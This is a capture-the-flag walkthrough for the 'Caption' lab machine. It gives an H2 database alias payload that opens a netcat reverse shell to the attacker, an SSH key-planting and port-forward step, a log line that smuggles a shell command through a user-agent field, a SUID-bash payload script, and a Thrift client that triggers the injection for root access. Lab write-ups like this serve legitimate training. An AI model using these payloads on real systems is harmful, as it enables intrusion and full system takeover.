Caption Walkthrugh
User Flag
Scan Nmap
8080/tcp openhttp-proxy
80/tcpopenhttp
22/tcpopenssh
OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
add 10.10.11.33 caption.htb to /etc/hosts
http://caption.htb:8080
root:root
http://caption.htb:8080/admin/dbviewer
reference: https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html
rlwrap nc -nvlp 9999
run:
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new
java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ?
s.next() : ""; }$$;
CALL SHELLEXEC('busybox nc 10.10.14.15 9999 -e sh')
id : uid=1000(margo) gid=1000(margo) groups=1000(margo)
user flag: cat /home/margo/user.txtRoot flag
On attack machine run ssh-keyget -t rsa
chmod 600 id_rsa
copy contents from id_rsa.pub and write to the .ssh/authorized_keys on the remote shell
ssh into machine
ssh -L 9090:127.0.0.1:9090 -i id_rsa margo@10.10.11.33
Create this file on /tmp/malicious.log on the remote machine:
127.0.0.1 "user-agent":"'; /bin/bash /tmp/payload.sh #"
Create this file on /tmp/payload.sh on the remote machine:
chmod +s /bin/bash
install thrift client: https://thrift-tutorial.readthedocs.io/en/latest/installation.html
On host machine:
Create a file named log_service.thrift with the following content:
namespace go log_service
service LogService {
string ReadLogFile(1: string filePath)
}
run : thrift -r --gen py log_service.thrift
cd gen-py
create client.py :from thrift import Thrift
from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol
from log_service import LogService # Import generated Thrift client code
def main():
# Set up a transport to the server
transport = TSocket.TSocket('localhost', 9090)
# Buffering for performance
transport = TTransport.TBufferedTransport(transport)
# Using a binary protocol
protocol = TBinaryProtocol.TBinaryProtocol(transport)
# Create a client to use the service
client = LogService.Client(protocol)
# Open the connection
transport.open()
try:
# Specify the log file path to process
log_file_path = "/tmp/malicious.log"
# Call the remote method ReadLogFile and get the result
response = client.ReadLogFile(log_file_path)
print("Server response:", response)
except Thrift.TException as tx:
print(f"Thrift exception: {tx}")
# Close the transport
transport.close()
if __name__ == '__main__':main()
run python3 client.py
on shell run
/bin/bash -p
cat /root/root.txt
